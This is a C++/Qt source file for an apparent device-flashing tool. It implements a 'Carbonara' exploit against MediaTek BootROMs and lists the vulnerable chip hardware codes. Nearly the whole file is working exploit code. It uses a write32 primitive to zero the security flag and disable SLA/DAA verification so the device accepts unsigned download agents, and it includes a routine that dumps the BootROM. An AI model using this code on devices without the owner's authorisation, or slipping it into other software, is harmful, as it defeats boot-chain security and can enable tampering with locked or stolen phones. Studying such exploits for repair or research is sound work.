#include "carbonara_exploit.h"
#include "mediatek/protocol/brom_client.h"
#include "transport/i_transport.h"
#include "core/logger.h"

namespace sakura {

static constexpr char LOG_TAG[] = "MTK-CARBONARA";

// HW codes known to be vulnerable to the Carbonara write32 primitive
const QList<uint16_t> CarbonaraExploit::s_supportedHwCodes = {
    0x0321, // MT6735
    0x0335, // MT6737
    0x0699, // MT6739
    0x0326, // MT6750
    0x0337, // MT6753
    0x0551, // MT6755
    0x0562, // MT6757
    0x0717, // MT6761
    0x0690, // MT6763
    0x0766, // MT6765
    0x0707, // MT6768
    0x0788, // MT6771
    0x0813, // MT6785
};

CarbonaraExploit::CarbonaraExploit(QObject* parent)
    : IBromExploit(parent)
{
}

CarbonaraExploit::~CarbonaraExploit() = default;

bool CarbonaraExploit::isSupported(uint16_t hwCode) const
{
    return s_supportedHwCodes.contains(hwCode);
}

ExploitResult CarbonaraExploit::execute(BromClient* brom, ITransport* transport,
                                         const BromExploitTarget& target)
{
    Q_UNUSED(transport)
    ExploitResult result;
    result.type = ExploitType::Carbonara;

    emit progressMessage("Patching security flags via write32...");

    if (!patchSecurityFlags(brom, target)) {
        result.success = false;
        result.message = "Failed to patch security flags";
        return result;
    }

    emit progressMessage("Security flags patched â€” device accepts unsigned DA");

    // Optional: dump BROM for analysis
    // result.bromDump = dumpBrom(brom, target);

    result.success = true;
    result.message = "Carbonara exploit succeeded";
    return result;
}

bool CarbonaraExploit::patchSecurityFlags(BromClient* brom, const BromExploitTarget& target)
{
    if (target.securityPtr == 0) {
        LOG_WARNING_CAT(LOG_TAG, "No security pointer defined for this target");
        return false;
    }

    LOG_INFO_CAT(LOG_TAG, QString("Patching security at 0x%1")
                              .arg(target.securityPtr, 8, 16, QChar('0')));

    // Read current value
    QByteArray current = brom->read32(target.securityPtr, 1);
    if (current.size() < 4) {
        LOG_ERROR_CAT(LOG_TAG, "Failed to read security flag");
        return false;
    }

    // Write 0x00000000 to disable SLA/DAA check
    QList<uint32_t> patch = { 0x00000000 };
    if (!brom->write32(target.securityPtr, patch)) {
        LOG_ERROR_CAT(LOG_TAG, "Failed to write security flag");
        return false;
    }

    // Verify patch
    QByteArray verify = brom->read32(target.securityPtr, 1);
    if (verify.size() >= 4) {
        uint32_t val = *reinterpret_cast<const uint32_t*>(verify.constData());
        if (val != 0) {
            LOG_WARNING_CAT(LOG_TAG, "Security flag may not have been patched correctly");
            return false;
        }
    }

    LOG_INFO_CAT(LOG_TAG, "Security flags cleared successfully");
    return true;
}

QByteArray CarbonaraExploit::dumpBrom(BromClient* brom, const BromExploitTarget& target)
{
    if (target.bromSize == 0)
        return {};

    LOG_INFO_CAT(LOG_TAG, QString("Dumping BROM: 0x%1, %2 bytes")
                              .arg(target.bromBase, 8, 16, QChar('0'))
                              .arg(target.bromSize));

    emit progressMessage("Dumping BROM...");

    // Read BROM in 4-byte chunks via read32
    constexpr int WORDS_PER_BATCH = 256; // 1 KiB per read
    QByteArray dump;
    dump.reserve(static_cast<int>(target.bromSize));

    uint32_t remaining = target.bromSize;
    uint32_t addr = target.bromBase;

    while (remaining > 0) {
        uint32_t count = qMin<uint32_t>(WORDS_PER_BATCH, remaining / 4);
        if (count == 0) count = 1;

        QByteArray chunk = brom->read32(addr, count);
        if (chunk.isEmpty()) {
            LOG_ERROR_CAT(LOG_TAG, QString("BROM dump failed at 0x%1").arg(addr, 8, 16, QChar('0')));
            break;
        }

        dump.append(chunk);
        addr += count * 4;
        remaining -= count * 4;
    }

    LOG_INFO_CAT(LOG_TAG, QString("BROM dump complete: %1 bytes").arg(dump.size()));
    return dump;
}

} // namespace sakura
